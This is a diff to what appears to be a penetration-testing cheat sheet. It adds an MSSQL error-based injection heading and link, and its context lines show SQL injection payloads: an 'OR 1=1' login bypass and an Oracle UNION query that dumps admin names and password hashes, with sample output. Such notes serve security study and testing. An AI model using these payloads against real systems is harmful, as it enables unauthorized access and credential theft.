@@ -284,7 +284,7 @@ admin ' OR 1=1 --
 ````
 admin ' OR 1=1 --
 ````
-#### Oracle DB dumping creds
+#### Oracle UNION DB dumping creds
 ````
 https://web.archive.org/web/20220727065022/https://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html
 ````
@@ -318,6 +318,11 @@ Blog entry from ADMIN_NAME with title null from 0
 Blog entry from PASSWORD with title null from 0
 ' union select ADMIN_NAME||PASSWORD,null,null from WEB_ADMINS-- #query
 Blog entry from admind82494f05d6917ba02f7aaa29689ccb444bb73f20380876cb05d1f37537b7892 with title null from 0
+````
+
+#### MSSQL Error DB dumping creds
+````
+https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
 ````
 ### SSRF
 SSRF vulnerabilities occur when an attacker has full or partial control of the request sent by the web application. A common example is when an attacker can control the third-party service URL to which the web application makes a request.
